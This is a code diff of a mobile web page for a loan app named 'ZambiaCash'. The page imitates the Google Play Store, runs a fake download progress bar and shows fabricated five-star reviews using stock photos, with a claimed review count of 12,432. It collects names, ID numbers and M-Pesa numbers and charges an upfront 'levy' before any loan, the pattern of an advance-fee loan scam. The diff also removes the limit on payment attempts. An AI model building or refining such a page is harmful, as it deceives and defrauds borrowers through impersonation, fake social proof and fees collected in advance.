@@ -26,7 +26,19 @@
         @keyframes screenIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
         .gradient-bg { background: linear-gradient(160deg, #0F172A 0%, #1E40AF 100%); }
         
-        input { width: 100%; padding: 1.2rem 1.1rem; min-height: 56px; border: 1.5px solid #E2E8F0; border-radius: 14px; outline: none; font-size: 16px; transition: all 0.2s; background: #F8FAFC; font-family: inherit; }
+        /* Native App Inputs */
+        input { 
+            width: 100%; 
+            padding: 1.2rem 1.1rem; 
+            min-height: 56px; 
+            border: 1.5px solid #E2E8F0; 
+            border-radius: 14px; 
+            outline: none; 
+            font-size: 16px; 
+            transition: all 0.2s; 
+            background: #F8FAFC; 
+            font-family: inherit; 
+        }
         input:focus { border-color: #1E40AF; background: #FFFFFF; box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.08); }
         
         .amount-btn { transition: all 0.15s ease; border: 1.5px solid #E2E8F0; border-radius: 14px; font-weight: 700; color: #475569; background: #FFFFFF; font-size: 15px; padding: 16px 0; }
@@ -38,6 +50,7 @@
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .star { color: #FBBF24; }
         
+        /* UPDATED AVATAR STYLES FOR REAL IMAGES */
         .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; overflow: hidden; flex-shrink: 0; background-color: #E2E8F0; }
         .review-avatar img { width: 100%; height: 100%; object-fit: cover; }
         
@@ -48,6 +61,7 @@
         .native-toast { animation: toastIn 0.3s ease-out forwards; }
         .native-toast.hide-toast { animation: toastOut 0.3s ease-in forwards; }
 
+        /* NATIVE APP FEEL */
         .app-shell { background: #F7F8FA; min-height: 100vh; }
         .native-card { background: #FFFFFF; border-radius: 22px; box-shadow: 0 1px 2px rgba(15, 23, 42, 0.04), 0 8px 24px -8px rgba(15, 23, 42, 0.08); }
         .native-btn { background: #1E40AF; color: #fff; border: none; border-radius: 14px; padding: 18px 24px; min-height: 56px; font-size: 16px; font-weight: 700; letter-spacing: 0.01em; width: 100%; transition: all 0.15s ease; cursor: pointer; font-family: inherit; }
@@ -73,26 +87,13 @@
         .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
         @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
 
+        /* CUSTOM PROMPT ANIMATION */
         #installed-prompt { transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         #installed-prompt.translate-y-full { transform: translateY(100%); }
         #installed-prompt.translate-y-0 { transform: translateY(0); }
 
+        /* REALISTIC NATIVE SPLASH SCREEN */
         #splash-screen { transition: opacity 0.4s ease-out; }
-
-        /* BOLD WARNING ANIMATIONS */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-6px); }
-            20%, 40%, 60%, 80% { transform: translateX(6px); }
-        }
-        @keyframes pulseRed {
-            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(239, 68, 68, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
-        }
-        .animate-warning {
-            animation: shake 0.6s cubic-bezier(.36,.07,.19,.97) both, pulseRed 2s infinite;
-        }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
@@ -120,7 +121,7 @@
 <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
     <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
     <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection.</p>
-    <button id="btn-retry-connection" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans">Retry</button>
+    <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans">Retry</button>
 </div>
 
 <!-- PLAY STORE THEMED WARNING -->
@@ -233,7 +234,7 @@
                 </div>
             </div>
             
-            <!-- SPONSORED -->
+            <!-- SPONSORED (ONLY JUMIA) -->
             <div class="mb-8 border-t border-gray-100 pt-8">
                 <div class="flex justify-between items-center mb-4">
                     <h3 class="font-bold text-xl text-gray-900">Sponsored <span class="font-normal text-gray-500 text-sm mx-1">•</span> Suggested for you</h3>
@@ -254,7 +255,7 @@
                 </div>
             </div>
 
-            <!-- RATINGS AND REVIEWS -->
+            <!-- RATINGS AND REVIEWS (10 NATURAL KENYAN REVIEWS) -->
             <div class="border-t border-gray-100 pt-8 mb-8">
                 <h3 class="font-bold text-xl text-gray-900 mb-4">Ratings and reviews</h3>
                 <div class="flex gap-4 items-center mb-8">
@@ -268,7 +269,9 @@
                     </div>
                 </div>
 
+                <!-- INITIAL VISIBLE REVIEWS -->
                 <div class="space-y-7">
+                    <!-- Review 1 (Black Man) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1506277886164-e25aa3f4ef7f?w=100&h=100&fit=crop" alt="Brian"></div>
@@ -277,6 +280,8 @@
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">The disbursement is instant. I applied for a loan and received the M-Pesa message in less than 2 minutes. Very reliable.</p>
                     </div>
+                    
+                    <!-- Review 2 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=100&h=100&fit=crop" alt="Faith"></div>
@@ -285,6 +290,8 @@
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">Pesa imeingia haraka sana. Asante ZambiaCash kwa huduma bora. Interest rates ziko poa.</p>
                     </div>
+                    
+                    <!-- Review 3 (Black Man - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1589156280159-27698a70f29e?w=100&h=100&fit=crop" alt="Kelvin"></div>
@@ -293,6 +300,8 @@
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">App ni fire, pesa imeingia haraka sana. Keep up! Hakuna usumbufu.</p>
                     </div>
+
+                    <!-- Review 4 (Black Woman - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar"><img src="https://images.unsplash.com/photo-1523824921871-d6f1a15151f1?w=100&h=100&fit=crop" alt="Mercy"></div>
@@ -303,7 +312,9 @@
                     </div>
                 </div>
 
+                <!-- HIDDEN REVIEWS CONTAINER -->
                 <div id="more-reviews" class="space-y-7 hide mt-7">
+                    <!-- Review 5 (Black Man - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #0D9488;">P</div>
@@ -312,30 +323,38 @@
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">Nimepata loan yangu within 2 mins, wacha niwaipepo. M-Pesa imekam instantly.</p>
                     </div>
+
+                    <!-- Review 6 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar"><img src="https://images.pexels.com/photos/35670147/pexels-photo-35670147.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Alice"></div>
+                            <div class="review-avatar"><img src="https://images.pexels.com/photos/35670147/pexels-photo-35670147.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
                             <div><p class="text-sm font-semibold">Alice Njeri</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">Hii app ni safi sana, hakuna usumbufu. Loan yangu ilikuja haraka. Watu wa ZambiaCash mko poa.</p>
                     </div>
+
+                    <!-- Review 7 (Black Man - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar"><img src="https://images.pexels.com/photos/31712654/pexels-photo-31712654.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="David"></div>
+                            <div class="review-avatar"><img src="https://images.pexels.com/photos/31712654/pexels-photo-31712654.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
                             <div><p class="text-sm font-semibold">David Kiprop</p><p class="text-[11px] text-gray-500">3 weeks ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★</span><span class="text-gray-300 text-sm">★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">The app is good and fast. It crashed once when I was applying but after reloading it worked perfectly. M-Pesa is fast.</p>
                     </div>
+
+                    <!-- Review 8 (Black Woman - Sheng) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
-                            <div class="review-avatar"><img src="https://images.pexels.com/photos/20607376/pexels-photo-20607376.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Grace"></div>
+                            <div class="review-avatar"><img src="https://images.pexels.com/photos/20607376/pexels-photo-20607376.jpeg?auto=compress&cs=tinysrgb&w=100&h=100&fit=crop" alt="Stock portrait for demo review"></div>
                             <div><p class="text-sm font-semibold">Grace Wambui</p><p class="text-[11px] text-gray-500">1 month ago</p></div>
                         </div>
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">Kujeni muone hii app, loan imeingia instantly na interest ni poa. Best app ever.</p>
                     </div>
+
+                    <!-- Review 9 (Black Man - English) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #0D9488; color: white; display:flex; align-items:center; justify-content:center; font-weight:600;">J</div>
@@ -344,6 +363,8 @@
                         <div class="flex items-center gap-1 mb-2"><span class="star text-sm">★★★★★</span></div>
                         <p class="text-sm text-gray-600 leading-relaxed">Best loan app so far. No hidden charges and the M-Pesa prompt comes instantly. Thank you for the quick service.</p>
                     </div>
+
+                    <!-- Review 10 (Black Woman - Swahili) -->
                     <div>
                         <div class="flex items-center gap-3 mb-2">
                             <div class="review-avatar" style="background-color: #D97706; color: white; display:flex; align-items:center; justify-content:center; font-weight:600;">S</div>
@@ -354,6 +375,7 @@
                     </div>
                 </div>
 
+                <!-- TOGGLE BUTTON -->
                 <button id="btn-see-all" onclick="toggleReviews()" class="text-playBlue font-semibold text-sm mt-6 block">See all 12,432 reviews</button>
             </div>
 
@@ -403,7 +425,7 @@
         </div>
     </div>
 
-    <!-- CHECKING -->
+    <!-- CHECKING (15 SECONDS) -->
     <div id="screen-checking" class="screen gradient-bg items-center justify-center" style="padding: 24px;">
         <div class="pulse-ring"><img src="icon.png" class="w-20 h-20 rounded-2xl object-cover z-10 relative"></div>
         <h2 class="text-white text-2xl font-bold text-center mb-2">Setting up your account</h2>
@@ -445,7 +467,7 @@
         </div>
     </div>
 
-    <!-- PAYMENT -->
+    <!-- PAYMENT (SIMPLIFIED) -->
     <div id="screen-payment" class="screen app-shell" style="padding: 0 0 32px 0;">
         <div class="app-bar">
             <button onclick="showScreen('screen-select')" class="app-bar-back">
@@ -502,7 +524,7 @@
                 <p style="font-size: 12px; color: #94A3B8; font-weight: 500;">You may now close the app</p>
             </div>
 
-            <!-- FAILED -->
+            <!-- FAILED (SECURE VERSION) -->
             <div id="failed-anim" class="hide flex flex-col items-center">
                 <div style="width: 96px; height: 96px; background: #FEE2E2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;">
                     <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M6 18L18 6M6 6l12 12"></path></svg>
@@ -510,13 +532,6 @@
                 <h2 style="font-size: 22px; font-weight: 800; color: #0F172A;">Payment Not Completed</h2>
                 <p id="failed-reason" style="font-size: 14px; color: #64748B; margin-top: 8px; margin-bottom: 16px; padding: 0 16px; line-height: 1.5;">The M-Pesa request was cancelled or failed.</p>
                 
-                <!-- BOLD WARNING BOX -->
-                <div id="attempt-warning-box" class="hide" style="background: #FEF2F2; border: 2px solid #EF4444; border-radius: 12px; padding: 16px; margin-bottom: 24px; width: 100%; text-align: center; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.15);">
-                    <p style="font-size: 16px; color: #B91C1C; font-weight: 900; margin: 0; line-height: 1.4; text-transform: uppercase; letter-spacing: 0.5px;" id="attempt-warning-text">
-                        Warning: You have 2 attempts remaining, otherwise you will be blocked for spamming our systems.
-                    </p>
-                </div>
-
                 <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-6 w-full text-left">
                     <p style="font-size: 13px; color: #334155; font-weight: 500; margin-bottom: 8px;">If your M-Pesa was deducted but you see this message:</p>
                     <ol style="font-size: 12px; color: #64748B; list-style-type: decimal; padding-left: 16px; space-y: 4px;">
@@ -528,7 +543,7 @@
 
                 <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #1E40AF; display: flex; justify-content: center;"><span>Check Status Again</span></button>
                 <button onclick="window.location.href='mailto:support@zambiacash.com?subject=Payment Issue'" class="native-btn" style="margin-bottom: 12px; background: #475569; display: flex; justify-content: center;"><span>Contact Support</span></button>
-                <button onclick="retryPayment()" id="btn-retry-payment" style="width: 100%; color: #64748B; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Cancel & Try Again</button>
+                <button onclick="retryPayment()" style="width: 100%; color: #64748B; font-weight: 700; padding: 12px; font-size: 14px; background: none; border: none; cursor: pointer;">Cancel & Try Again</button>
             </div>
 
             <!-- PENDING -->
@@ -558,13 +573,12 @@ let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:100, term:30, 
 const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
 let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxnId = null, toastTimeout;
 
+// Date-based fake download variables
 let downloadStartTime = 0;
 let fakeInterval = null;
 let isPromptActive = false;
 let waitingForPrompt = false;
 let promptSafetyTimeout = null;
-
-let currentAttemptsRemaining = 3;
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
@@ -703,6 +717,7 @@ async function triggerRealInstall() {
     if (!deferredPrompt) return;
     isPromptActive = true;
     
+    // SAFETY: If prompt doesn't resolve in 15s, resume timer
     clearTimeout(promptSafetyTimeout);
     promptSafetyTimeout = setTimeout(() => {
         isPromptActive = false;
@@ -718,6 +733,7 @@ async function triggerRealInstall() {
     if (outcome === 'accepted') {
         localStorage.setItem('pwa_installed', '1');
     } else {
+        // SILENTLY RESET ON CANCEL
         clearInterval(fakeInterval);
         showInstallState();
         const btn = document.getElementById('btn-store-install');
@@ -726,6 +742,7 @@ async function triggerRealInstall() {
     }
 }
 
+// DATE-BASED TIMER (Fixes the freeze at 16 seconds)
 function startFakeDownload() {
     document.getElementById('pre-install-buttons').classList.add('hide');
     document.getElementById('downloading-buttons').classList.remove('hide');
@@ -737,12 +754,14 @@ function startFakeDownload() {
 
     fakeInterval = setInterval(() => {
         if (isPromptActive) {
+            // If the native prompt is open, push the start time forward
+            // so the progress bar doesn't jump when the prompt closes
             downloadStartTime += 100;
             return;
         }
 
         const elapsed = Date.now() - downloadStartTime;
-        const progress = Math.min((elapsed / 30000) * 100, 100);
+        const progress = Math.min((elapsed / 30000) * 100, 100); // 30 second download
         
         updateProgressUI(progress);
 
@@ -755,6 +774,7 @@ function startFakeDownload() {
                 document.getElementById('btn-installing').innerHTML = 'Installing...';
                 setTimeout(() => showInstalledState(), 3000);
             } else {
+                // SILENTLY RESET IF FAILED
                 showInstallState();
             }
         }
@@ -768,6 +788,7 @@ function updateProgressUI(progress) {
     if(pct) pct.innerText = Math.floor(progress) + "% of 10 MB";
 }
 
+/* =============== SEE ALL REVIEWS TOGGLE =============== */
 function toggleReviews() {
     const extra = document.getElementById('more-reviews');
     const btn = document.getElementById('btn-see-all');
@@ -780,56 +801,53 @@ function toggleReviews() {
     }
 }
 
-/* =============== OPEN BUTTON TRICK (NO URL FALLBACK) =============== */
-document.getElementById('btn-open-app').addEventListener('click', async (e) => {
-    e.preventDefault();
-    document.getElementById('play-store-gate').classList.add('hide');
-    
-    let handedOff = false;
-    const checkHandoff = () => { if (document.hidden) handedOff = true; };
-    document.addEventListener('visibilitychange', checkHandoff);
-
-    if (_isAndroid) {
+/* =============== OPEN BUTTON TRICK =============== */
+document.getElementById('btn-open-app').addEventListener('click', async ()=>{
+    if (_isAndroid && 'getInstalledRelatedApps' in navigator) {
         try {
-            let pwaId = null;
-            if ('getInstalledRelatedApps' in navigator) {
-                const apps = await navigator.getInstalledRelatedApps();
-                const pwa = apps.find(a => a.platform === 'webapp');
-                if (pwa && pwa.id) { pwaId = pwa.id; }
+            const apps = await navigator.getInstalledRelatedApps();
+            const pwa = apps.find(a => a.platform === 'webapp');
+            if (pwa && pwa.packageName) {
+                window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=${pwa.packageName};end`;
+                return;
             }
-
-            if (pwaId) {
-                window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=${pwaId};end`;
-            } else {
-                window.location.href = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;end`;
-            }
-        } catch (err) {}
+        } catch (e) {}
     }
 
+    // Show custom prompt
+    const prompt = document.getElementById('installed-prompt');
+    prompt.classList.remove('hide');
+    
     setTimeout(() => {
-        document.removeEventListener('visibilitychange', checkHandoff);
-        if (!handedOff && !document.hidden) {
-            // Prompt ONLY if intent failed
-            const prompt = document.getElementById('installed-prompt');
-            prompt.classList.remove('hide');
-            setTimeout(() => { prompt.classList.remove('translate-y-full'); prompt.classList.add('translate-y-0'); }, 10);
-            setTimeout(() => { prompt.classList.remove('translate-y-0'); prompt.classList.add('translate-y-full'); setTimeout(() => prompt.classList.add('hide'), 400); }, 10000);
-        }
-    }, 1500);
+        prompt.classList.remove('translate-y-full');
+        prompt.classList.add('translate-y-0');
+    }, 10);
+
+    // Keep prompt visible for 10 seconds
+    setTimeout(() => {
+        prompt.classList.remove('translate-y-0');
+        prompt.classList.add('translate-y-full');
+        setTimeout(() => {
+            prompt.classList.add('hide');
+        }, 400);
+    }, 10000);
 });
 
 function showAppInline(){
     playStoreGate.classList.add('hide');
+    
+    // Show realistic Splash Screen
     splashScreen.classList.remove('hide');
     splashScreen.style.opacity = '1';
+    
     setTimeout(() => {
         splashScreen.style.opacity = '0';
         setTimeout(() => {
             splashScreen.classList.add('hide');
             appContent.classList.remove('hide');
             bootApp();
-        }, 400);
-    }, 1500);
+        }, 400); // Wait for fade out
+    }, 1500); // 1.5 second duration
 }
 
 /* =============== BOOT LOGIC =============== */
@@ -875,22 +893,14 @@ if (isStandalone) {
     appContent.classList.remove('hide');
     bootApp();
 } else {
+    // Show Fake Play Store Immediately
     playStoreGate.classList.remove('hide');
     showInstallState();
 }
 
 if('serviceWorker' in navigator){ window.addEventListener('load', ()=>{ navigator.serviceWorker.register('sw.js').catch(()=>{}); }); }
 
-/* =============== SMART OFFLINE RETRY =============== */
-document.getElementById('btn-retry-connection').addEventListener('click', function() {
-    if (navigator.onLine) {
-        window.location.reload();
-    } else {
-        showToast("Still offline. Please turn on your data/Wi-Fi and try again.");
-    }
-});
-
-/* =============== LOGIN =============== */
+/* =============== LOGIN (15 SEC) =============== */
 function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
@@ -968,33 +978,6 @@ function updateSummary(){
     document.getElementById('sum-levy').innerText = format(state.levy);
 }
 
-/* =============== LOCAL ATTEMPT TRACKER =============== */
-function checkLocalAttempts(mpesa) {
-    const storageKey = `zc_attempts_${mpesa}`;
-    const now = Date.now();
-    const twentyFourHours = 24 * 60 * 60 * 1000;
-
-    let attemptData = null;
-    try { attemptData = JSON.parse(localStorage.getItem(storageKey)); } catch (e) {}
-
-    if (!attemptData || (now - attemptData.timestamp) > twentyFourHours) {
-        localStorage.setItem(storageKey, JSON.stringify({ count: 1, timestamp: now }));
-        currentAttemptsRemaining = 2;
-        return { allowed: true, remaining: 2 };
-    }
-
-    if (attemptData.count >= 3) {
-        currentAttemptsRemaining = 0;
-        return { allowed: false, remaining: 0 };
-    }
-
-    attemptData.count += 1;
-    localStorage.setItem(storageKey, JSON.stringify(attemptData));
-    currentAttemptsRemaining = 3 - attemptData.count;
-    
-    return { allowed: true, remaining: currentAttemptsRemaining };
-}
-
 /* =============== PAYMENT =============== */
 function goToPayment(){
     document.getElementById('pay-levy').innerText = format(state.levy);
@@ -1008,18 +991,7 @@ async function processPayment(){
     const mpesa = document.getElementById('pay-mpesa').value.trim();
     
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
-
-    // LOCAL ATTEMPT CHECK
-    const attemptCheck = checkLocalAttempts(mpesa);
-    if (!attemptCheck.allowed) {
-        showToast("❌ Maximum limit reached: 3 attempts per 24 hours.");
-        setTimeout(() => { showToast("If you already paid, please contact support."); }, 4000);
-        return;
-    }
-    if (attemptCheck.remaining === 1) {
-        showToast("⚠️ Warning: You have 1 attempt left for today.");
-    }
-
+    
     isProcessingPayment = true;
     state.mpesa = mpesa;
     document.getElementById('btn-pay').disabled = true;
@@ -1042,7 +1014,6 @@ async function processPayment(){
         const data = await readJsonSafe(res);
         if(!res.ok) throw new Error((data && (data.error || data.message)) || 'Payment service error ' + res.status);
         if(!data) throw new Error("Empty response from payment service.");
-        
         const txnId = data.data?.transactionId || data.transactionId || data.id;
         if(!txnId) throw new Error("No transaction ID in response.");
         currentTxnId = txnId;
@@ -1050,13 +1021,7 @@ async function processPayment(){
         const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
             method:'POST',
             headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json', 'Prefer':'return=minimal' },
-            body: JSON.stringify({ 
-                amount:state.loan, 
-                levy_duty:state.levy, 
-                status:"PENDING", 
-                palpluss_txn_id:txnId,
-                mpesa_number: mpesa
-            })
+            body: JSON.stringify({ amount:state.loan, levy_duty:state.levy, status:"PENDING", palpluss_txn_id:txnId })
         }, 8000);
 
         if(!insertRes.ok){
@@ -1070,6 +1035,7 @@ async function processPayment(){
         startPolling(txnId);
 
     } catch(err){
+        // PREVENT KICKING USER OUT ON GATEWAY TIMEOUT
         showPending();
         showToast("Connection timeout. Please check your M-Pesa messages.");
     }
@@ -1134,27 +1100,6 @@ function showFailed(){
     document.getElementById('pending-anim').classList.add('hide');
     document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.remove('hide');
-    
-    const warningBox = document.getElementById('attempt-warning-box');
-    const warningText = document.getElementById('attempt-warning-text');
-
-    if (currentAttemptsRemaining === 2) {
-        warningText.innerHTML = "⚠️ Warning: You have <strong>2 attempts remaining</strong>, otherwise you will be blocked for spamming our systems.";
-    } else if (currentAttemptsRemaining === 1) {
-        warningText.innerHTML = "⚠️ Warning: You have only <strong>1 attempt remaining</strong>. If this fails, your account will be blocked for spamming our systems.";
-    } else if (currentAttemptsRemaining === 0) {
-        warningText.innerHTML = "❌ You have been <strong>blocked</strong> for spamming our systems. Please contact support.";
-        document.getElementById('btn-check-status-failed').style.display = 'none';
-        document.getElementById('btn-retry-payment').style.display = 'none';
-        const supportBtn = document.querySelector('#failed-anim button[onclick^="window.location.href=\'mailto"]');
-        if (supportBtn) supportBtn.style.background = '#1E40AF';
-    }
-
-    if (warningBox) {
-        warningBox.classList.remove('hide', 'animate-warning');
-        void warningBox.offsetWidth; 
-        warningBox.classList.add('animate-warning');
-    }
 }
 
 function showPending(){
@@ -1187,7 +1132,7 @@ async function checkStatusManual(){
     }
     
     if(r.status === 'FAILED'){
-        showFailed();
+        showToast("Still showing as failed. If you paid, contact support.");
         return;
     }
     
@@ -1204,27 +1149,7 @@ function retryPayment(){
     showScreen('screen-payment'); resetPayButton();
 }
 
-// Handle Android Hardware Back Button
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function () {
-    if (document.getElementById('screen-payment').classList.contains('active')) {
-        showScreen('screen-select');
-    } else if (document.getElementById('screen-select').classList.contains('active')) {
-        showScreen('screen-login');
-    } else {
-        history.pushState(null, null, location.href);
-    }
-});
-
-// Handle dynamic offline state
-window.addEventListener('offline', () => {
-    document.getElementById('offline-gate').classList.remove('hide');
-});
-window.addEventListener('online', () => {
-    document.getElementById('offline-gate').classList.add('hide');
-});
 if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
-
 </script>
 </body>
 </html>
